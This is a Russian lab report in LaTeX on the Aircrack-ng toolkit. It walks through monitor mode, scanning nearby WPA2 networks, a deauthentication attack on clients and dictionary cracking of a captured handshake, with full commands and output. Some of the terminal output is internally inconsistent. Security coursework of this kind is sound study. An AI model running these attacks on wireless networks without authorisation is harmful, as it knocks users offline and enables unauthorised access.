\documentclass[10pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage[russian]{babel}
\usepackage[OT1]{fontenc}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\author{джомбо яшо}
\title{Набор инструментов для аудита беспроводных сетей AirCrack}
\begin{document}
\maketitle

\section{Цель работы}
~

Изучить основные возможности пакета AirCrack и принципы взлома WPA/WPA2 PSK и WEP.

\section{Ход работы}
\subsection{Изучение}

\paragraph{Изучить основные возможности пакета AirCrack и принципы взлома WPA/WPA2 PSK и WEP}

\begin{enumerate}
\item Airodump-ng - программа предназначенная для захвата сырых пакетов протокола 802.11 и особенно подходящая для сбора WEP IVов (Векторов Инициализации) с последующим их использованием в aircrack-ng. Если к вашему компьютеру подсоединен GPS навигатор
то airodump-ng способен отмечать координаты точек на картах

\item Aireplay-ng - Основная функция программы заключается в генерации трафика для последующего использования в aircrack-ng для взлома WEP и WPA-PSK ключей.

\item Aircrack-ng - Взламывает ключи WEP и WPA (Перебор по словарю).
\end{enumerate}

\paragraph{Запустить режим мониторинга на беспроводном интерфейсе}

\begin{verbatim}
root@debian:~# airmon-ng start wlan0

Found 4 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!

PID	Name
4197	NetworkManager
4218	wpa_supplicant
4219	dhclient
4287	dhclient

Process with PID 4287 (dhclient) is running on interface wlan0

Interface 	Chipset		       Driver

wlan0		Atheros 	ath9k     - [phy0]
				(monitor mode enabled on mon0
				
root@debian:~# kill 4197
root@debian:~# kill 4218
root@debian:~# kill 4219
root@debian:~# kill 4287
bash: kill:  ( 4287)   -no such procces   				
\end{verbatim}


\paragraph{Запустить утилиту airodump, изучить формат вывода этой утили-ты, форматы файлов, которые она может создавать}
~

При указании ключа --write, утилита создает набор файлов с заданным префиксом. Два из которых связаны с информацией о доступных сетях и представлены в двух форматах: csv и xml. Еще два фала содержать информацию о перехваченных пакетах. Файл типа .cap содержит перехваченные пакеты, в то время как csv содержит лишь сокращенную информацию. Стоит отметить, что csv - это формат хранения простой таблицы.

\subsection{Практическое задание}

\paragraph{Запустить режим мониторинга на беспроводном интерфейсе}

\begin{verbatim}
root@debian:~# airodump-ng mon0
 
 CH 11  ] [ Elapsed: 8 s   ] [ 2015-06-17  20:17
 
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  
     
 2B:16:2E:40:A9:61  -35        1        0    0  11  54e  WPA2 CCMP   PSK  home  
 D4:21:22:17:25:08  -42        2        0    0   7  54e  WPA2 CCMP   PSK  Sidor 
 C0:C1:C0:D2:D2:20  -45        5        0    0   1  54e  WPA2 CCMP   PSK  <length:   6>  
 00:26:5A:A0:84:84  -53        17       0    0   6  54e. WPA2 CCMP   PSK  leabe 
 10:9A:DD:86:FE:16  -55        1        0    0   9  54e  WPA2 CCMP   PSK nanas
  
 BSSID                STATION              PRW   RATE  Lost    Frames  Probe
 
 2B:16:2E:40:A9:61    08:87:23:90:12:14   -68    2-24     0        79   
 C0:C1:C0:D2:D2:20    C4:85:08:D5:6F:07    -27   0 -6e    0         3   
 18:62:2C:E0:D8:83    A0:6C:EC:5C:18:83   -61   6-2e     125      252
\end{verbatim}

\paragraph{Запустить сбор трафика для получения аутентификационных сообщений}

\begin{verbatim}
root@debian:~# airodump-ng mon2 --write airdump --bssid  C0:C1:C0:D2:D2:20  -c 4


 CH  4 ][ BAT: 1 hour 12 mins ][ Elapsed: 12 s ][ 2015-06-17 20:51 ][ fixed channel mon0: -1    
                                                                                                
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID             
                                                                                                
  C0:C1:C0:D2:D2:20  -45        5        0    0   1  54e  WPA2 CCMP   PSK  <length:   6>                   
                                                                                                
 BSSID              STATION            PWR   Rate    Lost  Packets  Probes                      
                                                                                                
2B:16:2E:40:A9:61    08:87:23:90:12:14   -68    2-24     0        79   
C0:C1:C0:D2:D2:20    C4:85:08:D5:6F:07    -27   0 -6e    0         3
18:62:2C:E0:D8:83    A0:6C:EC:5C:18:83   -61   6-2e     125      252   
 
\end{verbatim}

\paragraph{Произвести деаутентификацию одного из клиентов, до
тех пор, пока не удастся собрать необходимых для взлома аутенти-фикационных сообщений}
~

\begin{verbatim}
root@debian:~# aireplay-ng --ignore-negative-one --deauth 150 
-a C0:C1:C0:D2:D2:20 -h 18:62:2C:E0:D8:83:5C mon0
The interface MAC ( C4:85:08:D5:6F:07) doesn't match the specified MAC (-h).
	ifconfig mon0 hw ether  18:62:2C:E0:D8:83
22:10:51  Waiting for beacon frame (BSSID: C0:C1:C0:D2:D2:20) on channel -1
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
22:10:51  Sending DeAuth to broadcast -- BSSID: [C0:C1:C0:D2:D2:20]
22:10:52  Sending DeAuth to broadcast -- BSSID: [C0:C1:C0:D2:D2:20]
22:10:53  Sending DeAuth to broadcast -- BSSID: [C0:C1:C0:D2:D2:20]
22:10:54  Sending DeAuth to broadcast -- BSSID: [C0:C1:C0:D2:D2:20]
22:10:56  Sending DeAuth to broadcast -- BSSID: [C0:C1:C0:D2:D2:20]
22:10:57  Sending DeAuth to broadcast -- BSSID: [C0:C1:C0:D2:D2:20]
22:10:58  Sending DeAuth to broadcast -- BSSID: [C0:C1:C0:D2:D2:20]
22:10:59  Sending DeAuth to broadcast -- BSSID: [C0:C1:C0:D2:D2:20]
\end{verbatim}

В результате перехватываем пакет handshake:

\begin{verbatim}
root@debian:~# airodump-ng mon0 --bssid C0:C1:C0:D2:D2:20 -c 6 
--write dump --ignore-negative-one
 CH  6 ][ Elapsed: 1 min ][ 2015-06-17 22:35 ][ WPA handshake: C0:C1:C0:D2:D2:2
                                                                               
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH E
                                                                               
 C0:C1:C0:D2:D2:20  -45        5        0    0   1  54e  WPA2 CCMP   PSK  <length:   6>                   
                                                                               
 BSSID              STATION            PWR   Rate    Lost  Packets  Probes     
                                                                               
C0:C1:C0:D2:D2:20    C4:85:08:D5:6F:07    -27   0 -6e    0         3
\end{verbatim}

\paragraph{Произвести взлом используя словарь паролей}
~

Так как используемый пароль слишком сложный, в некоторую часть словаря был вставлен искомый пароль.

\begin{verbatim}
root@debian:~# aircrack-ng dump-05.cap -w English.dic 
Opening dump-05.cap


   #  BSSID              ESSID                     Encryption

   1  C0:C1:C0:D2:D2:20  -45                      WPA (1 handshake)



                                 Aircrack-ng 1.1


                   [01:01:31] 26024 keys tested (824.57 k/s)


                         Current passphrase: [ aumildar ]


      Master Key     : A2 93 AB 4B CC FB 32 5F CA BD A0 20 5F 10 00 B1 
                       E0 13 C5 50 73 7F 3D 09 5E B2 1E 1C 22 B7 2B 15 

      Transient Key  : 5B A5 01 18 6C E6 F1 80 32 59 3C 9C 76 FC 32 61
                       88 09 FF 8D F6 50 78 39 4E 71 17 0C CE 8E 74 25 
                       0A BE 5C D3 CB BB 34 5B E7 7D 01 A9 FE 9A B0 FE 
                       D0 26 11 5D AD 97 63 E7 4D 4E E1 36 9A F2 B2 07

      EAPOL HMAC     : 28 11 B1 64 6E  9D 99 45 B9 92 A3 44 F8 B2 86 60 
\end{verbatim}

\section{Выводы}

В ходе данной работы были изучены основные возможности пакеты Air Crack и принципы взлома WPA/WPA2 PSK.


\end{document}
